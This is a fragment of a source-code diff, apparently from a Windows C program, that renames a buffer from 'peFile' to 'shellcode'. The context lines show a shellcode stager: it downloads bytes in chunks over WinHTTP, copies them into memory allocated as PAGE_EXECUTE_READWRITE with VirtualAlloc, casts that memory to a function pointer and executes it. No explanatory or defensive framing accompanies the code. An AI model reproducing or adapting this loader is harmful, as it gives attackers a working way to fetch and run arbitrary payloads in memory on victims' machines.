@@ -15,7 +15,7 @@ int main(void*) {
 		hConnect = NULL,
 		hRequest = NULL;
 
-	BYTE* peFile = NULL;
+	BYTE* shellcode = NULL;
 	SIZE_T totalSize = 0;
 
 	while (!bResults)
@@ -87,31 +87,31 @@ int main(void*) {
 			if (dwDownloaded > 0)
 			{
 				// Write chunk to buffer
-				BYTE *peTMP = (BYTE*)realloc(peFile, totalSize + dwDownloaded);
-				if (!peTMP) {
-					free(peFile);
+				BYTE *chunk = (BYTE*)realloc(shellcode, totalSize + dwDownloaded);
+				if (!chunk) {
+					free(shellcode);
 					free(pszOutBuffer);
 					printf("Memory allocation failed\n");
 					exit(1);
 				}
-				peFile = peTMP;
-				memcpy(peFile + totalSize, pszOutBuffer, dwDownloaded);
+				shellcode = chunk;
+				memcpy(shellcode + totalSize, pszOutBuffer, dwDownloaded);
 				totalSize += dwDownloaded;
 			}
 			free(pszOutBuffer);
 		} while (dwSize > 0);
 	}
 
-	if (peFile && totalSize > 0)
+	if (shellcode && totalSize > 0)
 	{
 		// Allocate executable memory
 		void* execMem = VirtualAlloc(NULL, totalSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if (execMem == NULL) {
 			printf("VirtualAlloc failed with error %u\n", GetLastError());
-			free(peFile);
+			free(shellcode);
 			exit(1);
 		}
-		memcpy(execMem, peFile, totalSize);
+		memcpy(execMem, shellcode, totalSize);
 		// Define function pointer to that memory
 		void (*func)() = (void(*)())execMem;
 		__try {
